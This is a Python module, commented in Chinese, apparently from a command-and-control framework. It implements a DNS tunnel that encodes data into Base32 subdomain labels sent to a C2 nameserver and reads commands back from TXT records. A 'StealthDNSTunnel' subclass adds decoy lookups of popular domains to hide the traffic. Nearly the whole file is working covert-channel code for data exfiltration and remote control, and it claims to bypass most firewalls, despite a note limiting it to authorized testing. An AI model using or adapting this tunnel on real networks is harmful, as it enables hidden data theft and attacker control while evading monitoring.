#!/usr/bin/env python3
"""
DNS 隧道 - DNS Tunnel

通过 DNS 查询传输 C2 数据，可绕过大多数防火墙
仅用于授权渗透测试和安全研究

原理:
    - 客户端将数据编码到 DNS 查询的子域名中
    - 服务器从查询中提取数据
    - 响应通过 TXT/CNAME/A 记录返回

特性:
    - 支持多种记录类型
    - 自动分块和重组
    - 抗检测设计
"""

import socket
import struct
import time
import random
import hashlib
import logging
from typing import Optional, List, Dict, Any

from ..base import BaseTunnel, C2Config
from ..encoding import C2Encoder, ChunkEncoder

logger = logging.getLogger(__name__)

# DNS 库
try:
    import dns.resolver
    import dns.message
    import dns.query
    import dns.rdatatype
    HAS_DNSPYTHON = True
except ImportError:
    HAS_DNSPYTHON = False


class DNSTunnel(BaseTunnel):
    """
    DNS 隧道

    通过 DNS 查询传输数据，可穿透大多数防火墙

    Usage:
        config = C2Config(
            server="ns.c2.example.com",
            protocol="dns",
            domain="tunnel.example.com"
        )
        tunnel = DNSTunnel(config)

        if tunnel.connect():
            tunnel.send(b"data")
            response = tunnel.receive()
            tunnel.disconnect()
    """

    # DNS 标签最大长度
    MAX_LABEL_LENGTH = 63

    # DNS 域名最大长度
    MAX_DOMAIN_LENGTH = 253

    # 支持的记录类型
    RECORD_TYPES = {
        'A': 1,
        'TXT': 16,
        'CNAME': 5,
        'MX': 15,
        'AAAA': 28,
    }

    def __init__(self, config: C2Config):
        """
        初始化 DNS 隧道

        Args:
            config: C2 配置
        """
        super().__init__(config)

        # DNS 配置
        self.domain = config.domain or f"tunnel.{config.server}"
        self.nameserver = config.nameserver or config.server
        self.record_type = 'TXT'  # 默认使用 TXT 记录

        # 编码器
        self.encoder = C2Encoder()
        self.chunk_encoder = ChunkEncoder(chunk_size=self.MAX_LABEL_LENGTH)

        # 会话状态
        self._session_id = self._generate_session_id()
        self._sequence = 0
        self._resolver = None

        # 响应缓冲
        self._response_buffer: Dict[int, str] = {}
        self._expected_chunks = 0

    def _generate_session_id(self) -> str:
        """生成会话 ID"""
        unique = f"{time.time()}-{random.randint(0, 99999)}"
        return hashlib.md5(unique.encode()).hexdigest()[:8]

    def connect(self) -> bool:
        """
        建立 DNS 隧道连接

        Returns:
            是否成功
        """
        try:
            if HAS_DNSPYTHON:
                self._resolver = dns.resolver.Resolver()
                self._resolver.nameservers = [self.nameserver]
                self._resolver.timeout = self.config.timeout
                self._resolver.lifetime = self.config.timeout

            # 发送初始化查询
            init_query = f"init.{self._session_id}.{self.domain}"
            success = self._send_query(init_query)

            if success:
                self._connected = True
                logger.debug(f"DNS tunnel connected, session: {self._session_id}")
                return True

            return False

        except Exception as e:
            logger.error(f"DNS tunnel connect error: {e}")
            return False

    def disconnect(self) -> None:
        """断开 DNS 隧道"""
        if self._connected:
            try:
                # 发送关闭查询
                close_query = f"close.{self._session_id}.{self.domain}"
                self._send_query(close_query)
            except Exception as exc:
                logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

        self._connected = False
        self._resolver = None
        logger.debug("DNS tunnel disconnected")

    def send(self, data: bytes) -> bool:
        """
        通过 DNS 发送数据

        数据格式: <session>.<seq>.<total>.<data>.tunnel.domain.com

        Args:
            data: 要发送的数据

        Returns:
            是否成功
        """
        if not self._connected:
            logger.warning("Cannot send: not connected")
            return False

        try:
            # Base32 编码 (DNS 安全)
            encoded = self.encoder.base32_encode(data)

            # 分块
            chunks = self._split_data(encoded)
            total = len(chunks)

            for i, chunk in enumerate(chunks):
                # 构造查询域名
                # 格式: <seq>.<chunk_index>.<total>.<data>.<session>.<domain>
                self._sequence += 1
                query_name = (
                    f"{self._sequence}.{i}.{total}."
                    f"{chunk}.{self._session_id}.{self.domain}"
                )

                if not self._send_query(query_name):
                    logger.warning(f"Failed to send chunk {i}/{total}")
                    return False

                # 小延迟避免速率限制
                time.sleep(0.05 + random.uniform(0, 0.05))

            return True

        except Exception as e:
            logger.error(f"DNS send error: {e}")
            return False

    def receive(self, timeout: Optional[float] = None) -> Optional[bytes]:
        """
        通过 DNS TXT 记录接收数据

        Args:
            timeout: 超时时间

        Returns:
            接收到的数据，无数据返回 None
        """
        if not self._connected:
            return None

        try:
            # 查询响应域名
            query_name = f"r.{self._session_id}.{self.domain}"

            if HAS_DNSPYTHON:
                return self._receive_dnspython(query_name)
            else:
                return self._receive_raw(query_name)

        except Exception as e:
            logger.debug(f"DNS receive error: {e}")
            return None

    # ==================== 内部方法 ====================

    def _split_data(self, data: str) -> List[str]:
        """将数据分割为 DNS 标签"""
        # 计算可用长度 (减去元数据开销)
        overhead = len(f"999.999.999..{self._session_id}.{self.domain}") + 10
        max_chunk = min(self.MAX_LABEL_LENGTH, (self.MAX_DOMAIN_LENGTH - overhead) // 2)

        chunks = []
        for i in range(0, len(data), max_chunk):
            chunks.append(data[i:i + max_chunk])

        return chunks

    def _send_query(self, query_name: str) -> bool:
        """发送 DNS 查询"""
        if HAS_DNSPYTHON:
            return self._send_dnspython(query_name)
        else:
            return self._send_raw(query_name)

    def _send_dnspython(self, query_name: str) -> bool:
        """使用 dnspython 发送查询"""
        try:
            self._resolver.resolve(query_name, 'A')
            return True
        except dns.resolver.NXDOMAIN:
            # 预期的响应 - 数据已发送
            return True
        except dns.resolver.NoAnswer:
            return True
        except dns.resolver.Timeout:
            return True
        except Exception as e:
            logger.debug(f"DNS query failed: {e}")
            return False

    def _send_raw(self, query_name: str) -> bool:
        """使用原始 socket 发送查询"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self.config.timeout)

            query = self._build_dns_query(query_name)
            sock.sendto(query, (self.nameserver, 53))

            try:
                sock.recvfrom(512)
            except socket.timeout:
                pass

            sock.close()
            return True

        except Exception as e:
            logger.debug(f"Raw DNS send failed: {e}")
            return False

    def _receive_dnspython(self, query_name: str) -> Optional[bytes]:
        """使用 dnspython 接收数据"""
        try:
            answers = self._resolver.resolve(query_name, 'TXT')

            # 合并所有 TXT 记录
            data_parts = []
            for rdata in answers:
                for txt in rdata.strings:
                    data_parts.append(txt.decode())

            if data_parts:
                combined = ''.join(data_parts)
                return self.encoder.base32_decode(combined)

        except dns.resolver.NXDOMAIN:
            pass
        except dns.resolver.NoAnswer:
            pass
        except Exception as e:
            logger.debug(f"DNS receive failed: {e}")

        return None

    def _receive_raw(self, query_name: str) -> Optional[bytes]:
        """使用原始 socket 接收数据"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self.config.timeout)

            query = self._build_dns_query(query_name, qtype=16)  # TXT
            sock.sendto(query, (self.nameserver, 53))

            try:
                response, _ = sock.recvfrom(4096)
                data = self._parse_txt_response(response)
                if data:
                    return self.encoder.base32_decode(data)
            except socket.timeout:
                pass

            sock.close()

        except Exception as e:
            logger.debug(f"Raw DNS receive failed: {e}")

        return None

    def _build_dns_query(self, domain: str, qtype: int = 1) -> bytes:
        """
        构建 DNS 查询包

        Args:
            domain: 查询域名
            qtype: 查询类型 (1=A, 16=TXT)

        Returns:
            DNS 查询包
        """
        # Transaction ID
        tid = random.randint(0, 65535)
        packet = struct.pack(">H", tid)

        # Flags (标准查询, 递归请求)
        packet += struct.pack(">H", 0x0100)

        # Questions, Answers, Authority, Additional
        packet += struct.pack(">HHHH", 1, 0, 0, 0)

        # Query name
        for label in domain.split('.'):
            if label:
                packet += struct.pack("B", len(label)) + label.encode()
        packet += b'\x00'

        # Query type and class
        packet += struct.pack(">HH", qtype, 1)

        return packet

    def _parse_txt_response(self, response: bytes) -> Optional[str]:
        """
        解析 DNS TXT 响应

        Args:
            response: DNS 响应包

        Returns:
            TXT 记录内容
        """
        try:
            # 跳过头部 (12 bytes)
            offset = 12

            # 跳过查询部分
            while offset < len(response) and response[offset] != 0:
                length = response[offset]
                if length >= 192:  # 压缩指针
                    offset += 2
                    break
                offset += length + 1
            offset += 5  # NULL + QTYPE + QCLASS

            # 解析答案部分
            texts = []
            while offset < len(response):
                # 跳过名称
                if response[offset] >= 192:
                    offset += 2
                else:
                    while offset < len(response) and response[offset] != 0:
                        offset += response[offset] + 1
                    offset += 1

                if offset + 10 > len(response):
                    break

                # 类型、类、TTL、长度
                rtype = struct.unpack(">H", response[offset:offset + 2])[0]
                offset += 8
                rdlength = struct.unpack(">H", response[offset:offset + 2])[0]
                offset += 2

                if rtype == 16:  # TXT
                    end = offset + rdlength
                    while offset < end:
                        txt_len = response[offset]
                        offset += 1
                        if offset + txt_len <= end:
                            texts.append(response[offset:offset + txt_len].decode())
                        offset += txt_len
                else:
                    offset += rdlength

            return ''.join(texts) if texts else None

        except Exception as e:
            logger.debug(f"Parse TXT response failed: {e}")
            return None


# ==================== 高级 DNS 隧道 ====================

class StealthDNSTunnel(DNSTunnel):
    """
    隐蔽 DNS 隧道

    增强隐蔽性:
    - 随机化查询时间
    - 混合使用多种记录类型
    - 模拟正常 DNS 流量
    """

    def __init__(self, config: C2Config):
        super().__init__(config)

        # 用于混淆的正常域名
        self._decoy_domains = [
            'google.com',
            'facebook.com',
            'microsoft.com',
            'amazon.com',
            'cloudflare.com',
        ]

    def send(self, data: bytes) -> bool:
        """隐蔽发送数据"""
        # 发送一些正常查询作为掩护
        self._send_decoy_queries()

        # 发送实际数据
        return super().send(data)

    def _send_decoy_queries(self) -> None:
        """发送伪装查询"""
        num_decoys = random.randint(1, 3)

        for _ in range(num_decoys):
            domain = random.choice(self._decoy_domains)
            try:
                socket.gethostbyname(domain)
            except Exception as exc:
                logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

            time.sleep(random.uniform(0.1, 0.5))


__all__ = [
    'DNSTunnel',
    'StealthDNSTunnel',
    'HAS_DNSPYTHON',
]
